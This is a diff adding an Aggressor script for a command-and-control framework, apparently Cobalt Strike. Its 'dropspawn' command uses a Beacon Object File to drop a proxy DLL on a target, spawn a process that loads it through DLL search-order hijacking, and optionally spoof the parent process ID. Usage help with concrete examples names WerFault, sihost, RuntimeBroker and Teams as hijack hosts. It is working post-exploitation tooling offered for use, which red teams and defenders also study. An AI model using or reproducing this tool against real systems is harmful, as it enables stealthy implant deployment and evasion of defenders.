@@ -1,0 +1,134 @@
+alias dropspawn
+{
+    local('$bid @result $proc $barch $args $dllbytes $listener $architecture $payload $writabledir $hijackname $program $commandlineargs $ppid $command $data $script $output $basedir $filehash');
+
+    if (size(@_) < 4 || size(@_) > 6)
+    {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("dropspawn"));
+        return;
+    }
+
+    $bid = $1;
+    $barch  = barch($1);
+    $payload = $2;
+    $hijackname = split("/", $payload)[-1];
+    $listener = $3;
+    $architecture = $3;
+    $targetpath = "";
+    $writabledir = "";
+    $program = "";
+    $commandlineargs = "";
+    $parent = $6;
+
+    if(!-exists $payload)
+    {    
+        berror($1, "Payload DLL: $2 does not seem to exist!");
+        exit();
+    }
+
+    if($architecture !in @("x86", "x64"))
+    {
+        berror($1, "Architecture: $architecture is not a valid architecture!")
+    }
+
+    $program = substr($4, 0, indexOf($4, ".exe") + 4);
+    $commandlineargs = substr($4, indexOf($4, ".exe") + 4);
+
+    #If no backslashes present, we assume this is a system32/syswow64 program and need to figure out the path based on beacon arch and desired arch
+    if("\\" !isin $program)
+    {
+        #if barch == architecture, either x86-x86 or x64-x64
+        if($barch eq $architecture)
+        {
+            $program = "C:\\Windows\\System32\\" . $program;
+        }
+        else if($barch eq "x64" && $architecture eq "x86")
+        {
+            $program = "C:\\Windows\\SysWOW64\\" . $program;
+        }
+        else if($barch eq "x86" && $architecture eq "x64")
+        {
+            $program = "C:\\Windows\\Sysnative\\" . $program;
+        }
+    }
+
+    #If a writeable directory was provided, ensure that we have a trailing backslash on it when sending to BOF. Alternatively, if '.' was specified just pass that directly to BOF.
+    if($5 ne "")
+    {
+        if(right($5, 1) eq "\\")
+        {
+            $writabledir = $5;
+        }
+        else
+        {
+            $writabledir = $5 . "\\";
+        }
+    }
+
+    #Fetch MD5 Hash of payload that will be written to disk for logging purposes
+    $data = exec("md5sum " . $payload);
+    $output = readln($data);
+    $filehash = split(" ",$output, 2)[0];
+
+    #read in the Dll payload
+    $handle = openf($payload);
+    $dllbytes = readb($handle, -1);
+    closef($handle);
+
+    # read in the right BOF file
+    $handle = openf(script_resource("dropspawn. $+ $barch $+ .o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack the arguments
+    $args = bof_pack($bid, "bZZZZZ", $dllbytes, $hijackname, $program, $commandlineargs, $writabledir, $parent);
+
+    blog2($bid, "Dropping $payload \(MD5Sum: $filehash\) on target as $writabledir$hijackname and spawning new process!");
+
+    # Execute BOF
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+
+beacon_command_register(
+    "dropspawn",
+    "Spawn a new beacon by dropping a DLL to disk and loading it",
+	"
+Command: dropspawn
+Summary: This command will spawn a new beacon by dropping a proxy DLL
+         to the target machine and spawning a new process with an altered
+         application directory for its DLL search order. The DLL SHOULD 
+         delete itself from disk after the new process loads it.
+
+Usage:   dropspawn <proxy DLL> <x86|x64> <program to spawn> [writable target folder] [parent]
+		 proxy DLL              - The full path to the DLL downloaded from the target machine
+                                            that is to be used for proxying exports in the spawned process.
+		 x86|x64	               - The architecture of the beacon you wish to spawn.
+                   program to spawn       - The name or path of the executable to spawn and load the proxy DLL.
+                                            If the program is in system32/syswow64 just provide the name, 
+                                            otherwise provide the full path to the executable. Provide any 
+                                            arguments to the program after the executables name.
+                   writable target folder - Optional. A writable folder on the target system to drop the DLL
+                                            payload to. If no folder is specified, dropspawn will attempt to 
+                                            use the current directory. Specify . as a filler to use the 
+                                            current directory but also be able to specify a ppid.
+                   parent                 - Optional. The name of the desired process to use for PPID spoofing.
+                                            Your current beacon must be able to open the process with
+                                            PROCESS_CREATE_PROCESS rights. If running in a privileged context
+                                            you may need to run getprivs to enable your token privileges.
+Example:
+         dropspawn /root/gitlab/DropSpawn_BOF/dist/dbgcore.dll x64 \"WerFault.exe -u -p 4352 -s 160\" \"c:\\users\\tom jones\\appdata\\local\\temp\"
+         dropspawn /root/gitlab/DropSpawn_BOF/dist/coremessaging.dll x64 sihost.exe . svchost.exe
+         dropspawn /root/gitlab/DropSpawn_BOF/dist/umpdc.dll x64 \"RuntimeBroker.exe -Embedding\" c:\\users\\user svchost.exe
+         dropspawn /root/gitlab/DropSpawn_BOF/dist/version.dll x64 \"c:\\users\\ajones\\AppData\\Local\\Microsoft\\Teams\\current\\teams.exe --system-initiated\" c:\\users\\ajones explorer.exe         
+
+
+Note:   - DLL's change between Windows versions; always download the DLL you wish to use for proxying
+          from the machine you are going to use dropspawn on in order to ensure compatibility.
+        - If you are trying to spawn an x64 beacon from an x86 one, make sure you download the proxy DLL
+          from c:\\windows\\sysnative\\<proxy dll> in order to get the x64 version of the proxy DLL.
+        - If you are trying to spawn an x86 beacon from an x64 one, make sure you download the proxy DLL
+          from c:\\windows\\syswow64\\<proxy dll> in order to get the x86 version of the proxy DLL.
+"
+); 
